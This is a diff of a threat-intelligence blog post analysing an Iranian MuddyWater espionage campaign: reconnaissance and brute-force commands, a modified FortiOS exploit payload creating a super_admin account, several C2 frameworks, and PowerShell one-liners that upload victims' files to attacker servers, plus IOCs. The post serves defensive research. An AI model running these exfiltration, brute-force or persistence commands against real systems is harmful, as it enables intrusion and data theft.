@@ -4,7 +4,7 @@ classes: wide
 header:
   teaser: /assets/images/muddy/logo.png
 ribbon: black
-description: "A MuddyWater espionage campaign exposed"
+description: "MuddyWater espionage campaign exposed"
 categories:
   - Threat Research
 tags:
@@ -16,19 +16,19 @@ toc: true
 
 Ctrl-Alt-Intel researchers went hunting for exposed Iranian APT infrastructure. 
 
-We identified and dumped C2 tooling, scripts, logs, victim data, and other operational artefacts from a VPS hosted in the Netherlands. Ctrl-Alt-Intel assesses with high-confidence this server is operated by **MuddyWater** (also tracked as *Static Kitten*, *Mango Sandstorm*, *Earth Vetala*, *Seedworm*, TA450), a cyber espionage group attributed as a subordinate element within **Iran's Ministry of Intelligence and Security** (MOIS).
+We identified and dumped C2 tooling, scripts, logs, victim data, and other operational artefacts from a VPS hosted in the Netherlands. Ctrl-Alt-Intel assesses with **high-confidence** this server is operated by **MuddyWater** (also tracked as *Static Kitten*, *Mango Sandstorm*, *Earth Vetala*, *Seedworm*, *TA450*), a cyber espionage group attributed as a subordinate element within **Iran's Ministry of Intelligence and Security** (MOIS).
 
 Repeated operational security failures by the operators allowed our researchers to pivot using [Hunt.io](https://hunt.io/) to identify additional infrastructure that we also attribute to *MuddyWater*.
 
-This blog details the reconnaissance, initial access, command and control, and post-exploitation tradecraft observed - including two developed C2s, a Tsundere Botnet using Ethereum smart contracts, and the targeting of organisations across Israel, Jordan, the UAE, Portugal, and the United States.
+This blog details the reconnaissance, initial access, command and control, and post-exploitation tradecraft observed - including two developed C2s, a Tsundere Botnet using Ethereum smart contracts, and the targeting of organisations across Israel, Jordan, Egypt, the UAE, Portugal, and the United States.
 
-> Ctrl-Alt-Intel is not politically affiliated and does not conduct research in support of any government, ideology, or political agenda. The findings presented here are the result of independent threat intelligence research and are shared openly with the security community to help defenders identify, detect, and mitigate threat
+> Ctrl-Alt-Intel is not politically affiliated and does not conduct research in support of any government, ideology, or political agenda. The findings presented here are the result of independent threat intelligence research and are shared openly with the security community to help defenders identify, detect, and mitigate threats
 
 # Recon 
 
 MuddyWater was observed leveraging **Shodan** and **Nuclei** to identify potential vulnerable targets. Additionally, **subfinder** and **ffuf** were leveraged to perform enumeration of target web applications: 
 
-## Subfinder / ffuf 
+## Subfinder / ffuf dditionally scanned
 
 ```bash
 subfinder -d clearview.ai -o out-clearview..txt
@@ -49,6 +49,18 @@ ffuf -u https://www.zivorex.com/FUZZ -w directory-list-lowercase-2.3-medium.txt 
 * **Terrogence** - Israeli-owned private intelligence-as-a-service firm
 * **Zivorex** - UAE based online platform for selling Gold/Silver
 
+### Custom Subdomain Reconnaissance Pipeline 
+
+*MuddyWater* also operates a significantly more mature reconnaissance pipeline using the script `just-sub-v5.py`.
+
+The automated recon chains three subdomain enumeration tools together:
+
+1. **Sudomy** (run via Docker)
+2. **Subfinder**
+3. **OneForAll**
+
+Results are merged, deduplicated, and validated with **dnsx** to confirm live DNS resolution. The tool supports a two-layer approach: first enumerate subdomains of the target, then enumerate subdomains of *those* subdomains, effectively performing recursive subdomain discovery.
+
 ## Shodan CLI
 
 The threat actor used the command `shodan init` to authenticate with the API key, before running `shodan download` with two queries: 
@@ -57,7 +69,7 @@ The threat actor used the command `shodan init` to authenticate with the API key
 shodan download --limit -1 --fields ip_str,port ivanti-1 "title:'Ivanti User Portal: Sign In'"
 shodan download --limit -1 --fields ip_str,port ivanti-2 'http.favicon.hash:1983356674'
 ```
-Both of these queries were used to identify **Ivanti** devices on the internet. *MuddyWater* additionall scanned using **Nuclei** to identify targets vulnerable to Ivanti **CVE-2026-1281**:
+Both of these queries were used to identify **Ivanti** devices on the internet. *MuddyWater* additionally scanned using **Nuclei** to identify targets vulnerable to Ivanti **CVE-2026-1281**:
 
 ## Nuclei 
 
@@ -77,6 +89,8 @@ nuclei -l outputIPandport362091310.txt -t nuclei-templates/http/cves/2026/CVE-20
 * **CVE-2025-55182** - *React2Shell*
 * **CVE-2025-52691** - *SmarterTools SmarterMail* unrestricted file upload
 * **CVE-2025-54068** - *Laravel Livewire* RCE 
+* **CVE-2025-9316**  - *N-Central* improper access control
+* **CVE-2025-5777**  - *Citrix NetScaler* memory leak 
 * **CVE-2025-34291** - *Langflow* chained account takeover + RCE
 * **CVE-2024-55591** - *Fortinet FortiOS* authentication bypass
 * **CVE-2024-23113** - *Fortinet FortiOS* RCE
@@ -123,9 +137,52 @@ patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 pas
 patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 timeout 30
 ``` 
 
+## Fortigate Exploitation
+
+We observed the threat actor target multiple Fortinet related CVEs (**CVE-2024-55591**, **CVE-2024-23113** & **CVE-2022-42475**) in attempts to gain command execution on Edge devices. 
+
+We observed the threat actor had modified the [watchTowr CVE-2024-5559 POC](https://github.com/watchtowrlabs/fortios-auth-bypass-poc-CVE-2024-55591) that would allow for RCE. 
+
+* The original watchTowr PoC sends an operator-supplied command (for example, `get system status`) after forging the WebSocket login context. In the modified sample, this was replaced with **hardcoded FortiOS CLI configuration payloads** (`test1`–`test13`) focused on account creation, privilege escalation and persistence
+
+* Multiple embedded payloads attempt to create or modify local users and VPN groups (for example `FortiWiFi`, `darlen`, `offices`, and `VPN-Users` / `ssl-vpn-groupamoss`). Other commands (`show`, `list`, `?`) suggest hands-on testing of FortiOS CLI syntax during operations.
+
+* The payload actively executed in the sample (`test11`) attempts to create a new **FortiGate administrator** account, `FortiSetup`, with the `super_admin` profile and `root` VDOM. The password is supplied as a FortiOS `ENC` value rather than plaintext, consistent with an attempt to establish persistence:
+
+```bash
+config system admin
+    edit "FortiSetup"
+        set accprofile "super_admin"
+        set vdom "root"
+        set password ENC SH2x6nU4ztieZPUfFQpYaZY99xC3x4+7RFlL7+pkVYA/sW6Dd53lNOCATA3vbs=
+    next
+end
+```
+
+* The forged login context was also modified to include a different public IP (`194.11.246[.]101:1338`) instead of the public PoC placeholder, providing an additional operational artefact.
+
+```python
+# Original 
+login_message = f'"{args.user}" "admin" "watchTowr" "super_admin" "watchTowr" "watchTowr" [13.37.13.37]:1337 [13.37.13.37]:1337\r\n'
+
+# MuddyWater version:
+login_message = f'"{args.user}" "admin" "watchTowr" "super_admin" "watchTowr" "watchTowr" [194.11.246.101]:1338 [194.11.246.101]:1338\r\n'
+```
+
+I don't believe the provided IP address has an impact on exploitation, however *MuddyWater* still modified the script to change the IP address to `194.11.246[.]101`. Notably, this IP address is known *MuddyWater* infrastructure, previously reported by the security vendor **ESET** on a December 2025 analysis - [MuddyWater: Snakes by the riverbank](https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/). In ESET's blog, this IP address was noted as a "MuddyWater C&C server" - with no mention of Fortinet exploitation. 
+
+Ctrl-Alt-Intel identified one victim associated with this attack, an Israeli distributor of scientific equipment and quality control instruments.  
+
+## N-Central exploitation
+
+*MuddyWater* also performed mass-exploitation of **CVE-2025-9316**, a vulnerability in SolarWinds N-central, a widely deployed RMM (Remote Monitoring & Management) platform used by MSPs. This could allow *MuddyWater* to generate sessionIDs for unauthenticated users:
+
+[![1](/assets/images/muddy/11.png){: .align-center .img-border}](/assets/images/muddy/11.png)
+<p class="figure-caption">CVE-2025-9316 exploitation</p>  
+
 # Command & Control 
 
-Ctrl-Alt-Intel managed to retrieve multiple C2 server binaries, alongside corresponding clients, that were used by *MuddyWater*. 
+Ctrl-Alt-Intel managed to retrieve multiple C2 server binaries, alongside some corresponding clients, that were used by *MuddyWater*. 
 
 Some of the C2 components had previously been discussed by [Group-IB](https://www.group-ib.com/) in their analysis: [Operation Olalampo: Inside MuddyWater’s Latest Campaign](https://www.group-ib.com/blog/muddywater-operation-olalampo/). 
 
@@ -147,7 +204,14 @@ We observed this identical HTML page served within the exposed infrasture we obs
 [![1](/assets/images/muddy/6.png){: .align-center .img-border}](/assets/images/muddy/6.png)
 <p class="figure-caption">MuddyWater HTML splash page</p>  
 
-## Key C2 
+C2 server binaries have been uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/MuddyWater/C2%20server%20binaries).
+
+Although an analysis of all the server-side C2 binaries is not in the scope of this blog, we did run these ourselves to take a look how the operators would control victim machines:
+
+[![1](/assets/images/muddy/12.png){: .align-center .img-border}](/assets/images/muddy/12.png)
+<p class="figure-caption">MuddyWater C2 server</p>  
+
+## KeyC2 
 
 *MuddyWater* used a Python-based C2 server over UDP, named **Key C2**. This allows operators to remotely control compromised Windows machines over a custom binary protocol on port **1269** from a singular Python script. 
 
@@ -163,7 +227,7 @@ Once an operator selects a client, Key C2 supports the following capabilities:
 * File upload - push files from the C2 server to the victim
 * C2 server migration - instruct a client to redirect its beaconing to a different IP address, allowing the operator to move infrastructure without losing access
 
-Ctrl-Alt-Intel observed emojis in the response of output, indicative of AI-assisted development. 
+Ctrl-Alt-Intel observed emojis in the response of output, indicative of AI-assisted development. The source has been uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/MuddyWater/KeyC2).
 
 ## PersianC2
 
@@ -182,7 +246,9 @@ The operator dashboard supports:
 * Staging - a built-in mechanism that takes a template binary (calc.exe), appends a SHA-256 hash derived from the victim's username and computer name, and drops the payload to the victim
 * Client removal - queue an `exit!!` command that triggers the implant to self-terminate and deletes the database record
 
-### C2 log analysis
+The PersianC2 source code has been uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/MuddyWater/PersianC2).
+
+### C2 logging
 
 In the **PersianC2** directory we observed the files, `client.db`, `.command_history`, alongside directories `uploads` & `downloads`.
 
@@ -204,6 +270,30 @@ Although only one victim was observed beaconing from a Portuguese IP address, we
 # 2026-02-23 19:20:00.789845
 +cmd ping 8.8.8.8 -n 3
 ```
+
+## ArenaC2
+
+Ctrl-Alt-Intel identified an additional Python-based C2 framework on the *MuddyWater* server, which we have coined **ArenaC2**. 
+
+Unlike **Key C2**'s custom UDP protocol or **PersianC2**'s JSON API polling, **ArenaC2** operates over HTTP POST using a FastAPI/uvicorn web server and encrypts all traffic with AES-256-CBC.
+
+The C2 server presents a decoy landing page masquerading as "ArenaReport", a fictitious multilingual news website, when visited via a browser. This page includes embedded images, animated backgrounds, and content in English, French, and German - designed to make the C2 domain appear as a legitimate website to casual visitors or automated scanners.
+
+| Endpoint | Method | Purpose |
+|---|---|---|
+| `/` | GET | Decoy HTML landing page ("ArenaReport") |
+| `/redirect` | POST | **Stager** - delivers the implant executable to new victims |
+| `/sort` | POST | **Registration** - implant checks in with host reconnaissance, receives session ID and auth token |
+| `/deliver` | POST | **Tasking** - implant polls for queued commands |
+| `/deliver/0` | POST | Connection check result |
+| `/deliver/1` | POST | Shell creation result |
+| `/deliver/2` | POST | Command execution acknowledgement |
+| `/deliver/3` | POST | Shell output (streamed back to operator) |
+| `/deliver/4` | POST | Upload initiation acknowledgement |
+| `/deliver/5` | POST | Upload chunk acknowledgement |
+| `/deliver/6` | POST | Secondary payload delivery (`ConsoleApplicationen.exe`) |
+
+The file `ConsoleApplicationen.exe` identified on disk was not an executable, as the name would suggest. Ctrl-Alt-Intel has not analysed this further - but would encourage those who are interested to access this via our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/MuddyWater/ArenaC2).
 
 ## Proxy / Tunneling
 
@@ -283,6 +373,71 @@ This bot communicates over WebSocket to retrieve commands. Two historical IP add
 193.17.183[.]126
 ```
 
+# Exfiltration
+
+Although we observed *MuddyWater* use multiple custom-developed C2s, many of which had capabilities for exfiltration, we observed the threat actor leveraging **Wasabi S3**, **put.io**, **Amazon EC2** and separately a lightweight Python HTTP file server on the machine. 
+
+## Python-server
+
+A minimal Flask web application (`web.py`) was found serving as a **file exfiltration receiver**. It runs on port **10443** and accepts file uploads via a POST to `/success`:
+
+```python
+@app.route('/success', methods = ['POST'])
+def success():
+    if request.method == 'POST':
+        f = request.files['file']
+        f.save(f.filename)
+```
+
+A commented-out PowerShell one-liner demonstrates the intended client-side usage:
+
+```bat
+$wc = New-Object System.Net.WebClient
+$resp = $wc.UploadFile("http://127.0.0.1:5000/success","C:\Users\K3vin\Downloads\log.txt")
+```
+
+Ctrl-Alt-Intel observed *MuddyWater* run the below PowerShell commands in attempt to exfiltrate data from victim machines:
+
+```bat
+cd E:\DATA\PEACE2\Personnel_Share\CreditCards\Amex\;foreach ($name in ((ls).Name)){$wc = New-Object System.Net.WebClient ; $resp = $wc.UploadFile("hXXp://ec2-18-223-24-218.us-east-2.compute.amazonaws[.]com:443/success","E:\DATA\PEACE2\Personnel_Share\CreditCards\Amex\$name");sleep 2.5}
+
+
+Get-ChildItem -Path "C:\Users\riyad\desktop" -Recurse -File | ForEach-Object {$wc = New-Object System.Net.WebClient ; $resp = $wc.UploadFile("hXXp://157.20.182[.]49:10443/success",$($_.FullName));}
+```
+
+It appears *MuddyWater* is also operating an EC2 server used for exfiltration on the IP address `18.223.24[.]218`.
+
+### EgyptAir
+
+The Python HTTP exfiltration server was primarily used to steal sensitive internal EgyptAir data.
+
+This data included, but was not limited to:
+
+* Egyptian passport and visa information
+* Receipts from "King Khalid Int'l Airport" in Riyadh
+* Legal documents
+* Financial statements
+* Photos and videos from WhatsApp
+
+Although the files were predominantly related to EgyptAir, the PowerShell command exposing the file path `C:\Users\riyad\desktop`, along with the receipt from "King Khalid Int'l Airport," may suggest that this specific data was stolen from an computer associated with EgyptAir located in *Riyadh, Saudi Arabia*.
+
+More notably, in the same exfiltration directory, the threat actor had also stolen multiple scripts and binaries related to **ZKTeco**’s biometric time-and-attendance and physical access control systems.
+
+Although this could be coincidental, we noted that the exfiltrated **ZKTeco** biometric access control software and configurations may align with *MuddyWater*’s previous targeting of the U.S. company **Clearview AI**, a facial recognition provider.
+
+## Cloud Storage
+
+*MuddyWater* was also observed leveraging both **Wasabi S3** and **put.io** for exfiltrating stolen files. It appears *MuddyWater* attempted to backup files from the **S3** bucket to **put.io** using the **rclone** tool:
+
+```bash
+rclone config reconnect putio:
+rclone lsd putio:
+rclone lsd wasbbi:
+rclone lsd wasabbi:
+rclone lsd wasabbi:wasabirclone
+rclone copy wasabbi:wasabirclone/ERPBackup putio:/iiitdEDUin
+```
+
 # Pivoting (with Hunt.io)
 
 In the *Command & Control* section, Ctrl-Alt-Intel researchers identified a C2 IP address `162.0.230[.]185` that had already been linked to *MuddyWater* by Group-IB.
@@ -310,20 +465,24 @@ This assessment is based on the convergence of victimology, tooling overlaps wit
 
 ## Supporting Evidence 
 
-* **Expected victimology** - Targets span Israeli organisations (healthcare, hosting, immigration, intelligence), Jordanian government webmail, UAE companies, US entities, and Jewish/Israeli-linked NGOs - all consistent with known MOIS collection priorities. The compromise of Iranian marketplace **BaSalam** further aligns with MOIS's documented domestic surveillance mandate
+* **Expected victimology** - Targets span Israeli organisations (healthcare, hosting, immigration, intelligence), Egyptian airliner, Jordanian government webmail, UAE companies, US entities, and Jewish/Israeli-linked NGOs - all consistent with known MOIS collection priorities. The compromise of Iranian marketplace **BaSalam** further aligns with MOIS's documented domestic surveillance mandate.
 
-* **Direct overlap with Group-IB's Operation Olalampo** - In February 2026, Group-IB published research attributing Operation Olalampo to MuddyWater. We retrieved C2 components previously discussed in that analysis, and observed an identical "We'll Be Back Soon" splash page served on both our identified infrastructure and *MuddyWater*-linked IP addresses referenced in their reporting.
+* **Direct overlap with Group-IB's Operation Olalampo** - In February 2026, Group-IB published research attributing Operation Olalampo to MuddyWater. We retrieved C2 components, infrastructure, malware and tools previously discussed in that analysis, and observed an identical "We'll Be Back Soon" splash page served on both our identified infrastructure and *MuddyWater*-linked IP addresses referenced in their reporting
+
+* **Infrastructure overlap with ESET reporting** - The IP address `194.11.246[.]101`, embedded within *MuddyWater*'s modified Fortinet exploit, was previously identified by **ESET** in their December 2025 analysis [MuddyWater: Snakes by the riverbank](https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/) as a MuddyWater C&C server. 
 
 * **Persian/Farsi language artefacts** - Persian/Farsi strings were identified within `.bash_history`, commented source code, and the C2 framework we coined **PersianC2**. This is consistent with the profile of Iranian operators.
 
-* **Exploitation of edge devices** - Exploitation of multiple Fortinet CVEs aligns with a [2021 CISA/FBI joint advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-321a) documenting Iranian state-sponsored actors exploiting Fortinet vulnerabilities since at least March 2021. Similarly, this actor targeted Exchange servers and deployed webshells to Portuguese government infrastructure, consistent with *MuddyWater*'s well-documented history of exploiting Microsoft Exchange for initial access, as highlighted in the same CISA advisories
+* **Exploitation of edge devices** - Exploitation of multiple Fortinet CVEs aligns with a [2021 CISA/FBI joint advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-321a) documenting Iranian state-sponsored actors exploiting Fortinet vulnerabilities since at least March 2021. Similarly, this actor targeted Exchange servers and deployed webshells to Portuguese government infrastructure, consistent with *MuddyWater*'s well-documented history of exploiting Microsoft Exchange for initial access, as highlighted in the same CISA advisories.
 
 # Acknowledgements 
+
+Firstly, we would like to thank Security Researcher [@ice_wzl_cyber](https://x.com/ice_wzl_cyber) for his collaboration, insight and analysis into this *MuddyWater* campaign and blog. 
  
-Whilst writing this blog, Security researcher [@nahamike01](https://x.com/nahamike01) observed **KeyC2** & **Tsundere Botnet** activity linked to MuddyWater campaigns:
+Whilst writing this blog, Security Researcher [@nahamike01](https://x.com/nahamike01) also observed **KeyC2** & **Tsundere Botnet** activity linked to *MuddyWater* campaigns:
 
 [![1](/assets/images/muddy/10.png){: .align-center .img-border}](/assets/images/muddy/10.png)
-<p class="figure-caption">@nahamike01 Tweet</p>  
+<p class="figure-caption">@nahamike01 Tweet</p>  s
 
 # IOCs
 
@@ -334,6 +493,8 @@ Whilst writing this blog, Security researcher [@nahamike01](https://x.com/nahami
 | `162.0.230[.]185` | IP Address | MuddyWater C2 / Open Directory |
 | `157.20.182[.]49` | IP Address | Open Directory |
 | `209.74.87[.]100` | IP Address | Open Directory |
+| `18.223.24[.]218`| IP Address | Exfiltration Server | 
+| `194.11.246[.]101`| IP Address | Fortigate POC IP |  
 | `www.xt24[.]com` | Domain | Open Directory |
 | `reset.ps1` | Filename | Tsundere Bot PowerShell loader |
 | `0x2B77671cfEE4907776a95abbb9681eee598c102E` | Address | Smart Contract Address |
@@ -357,17 +518,22 @@ Whilst writing this blog, Security researcher [@nahamike01](https://x.com/nahami
 | **Initial Access** | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Exploitation of Fortinet, Ivanti, Exchange, BeyondTrust, and novel SQLi |
 | **Initial Access** | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | OWA password spraying against Israeli, Jordanian, and UAE targets |
 | **Initial Access** | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | `patator` SMTP brute-force against NMDC Group mail server |
+| **Discovery** | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | ArenaC2, KeyC2, and PersianC2 all collect OS version, architecture, VM status, and domain membership at check-in |
 | **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | `reset.ps1` - Tsundere Bot PowerShell loader decrypts and stages Node.js payloads |
 | **Execution** | [T1059.007](https://attack.mitre.org/techniques/T1059/007/) | Command and Scripting Interpreter: JavaScript | Obfuscated Node.js payloads (`VfZUSQi6oerKau.js`, `sysuu2etiprun.js`) |
 | **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Command and Scripting Interpreter: Windows Command Shell | Key C2 `cmd` and `cmdexec` modes for remote command execution |
 | **Persistence** | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys | `VfZUSQi6oerKau.js` creates a Run key for persistence |
 | **Persistence** | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Server Software Component: Web Shell | Neo-reGeorg ASPX webshell (`nfud.aspx`) deployed on compromised Exchange server |
+| **Persistence** | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | FortiGate exploitation creates `FortiSetup` admin account with `super_admin` profile |
 | **Defense Evasion** | [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | Obfuscated Node.js payloads within Tsundere Bot |
 | **Defense Evasion** | [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | Encrypted blobs decrypted at runtime by `reset.ps1` |
 | **Command and Control** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | PersianC2 HTTP polling; Tsundere Bot WebSocket C2 |
 | **Command and Control** | [T1095](https://attack.mitre.org/techniques/T1095/) | Non-Application Layer Protocol | Key C2 custom binary protocol over UDP port 1269 |
 | **Command and Control** | [T1102.001](https://attack.mitre.org/techniques/T1102/001/) | Web Service: Dead Drop Resolver | Ethereum smart contract used to resolve C2 server IP addresses |
 | **Command and Control** | [T1571](https://attack.mitre.org/techniques/T1571/) | Non-Standard Port | Key C2 operating on UDP port 1269 |
+| **Command and Control** | [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Encrypted Channel: Symmetric Cryptography | ArenaC2 encrypts all C2 traffic with AES-256-CBC using hardcoded keys |
 | **Command and Control** | [T1090.002](https://attack.mitre.org/techniques/T1090/002/) | Proxy: External Proxy | `resocks` and `revsocks` SOCKS proxy listeners for tunnelling into victim networks |
 | **Exfiltration** | [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Key C2 and PersianC2 both support file download from victims |
+| **Exfiltration** | [T1567](https://attack.mitre.org/techniques/T1567/) | Exfiltration Over Web Service | Stolen data exfiltrated to Wasabi S3 and put.io cloud storage via `rclone` |
+| **Exfiltration** | [T1048](https://attack.mitre.org/techniques/T1048/) | Exfiltration Over Alternative Protocol | Flask-based HTTP file receiver (`web.py`) on port 10443 and Amazon EC2 instance used for bulk file exfiltration outside C2 channel |
 | **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | SQL injection data exfiltration; file retrieval via C2 |
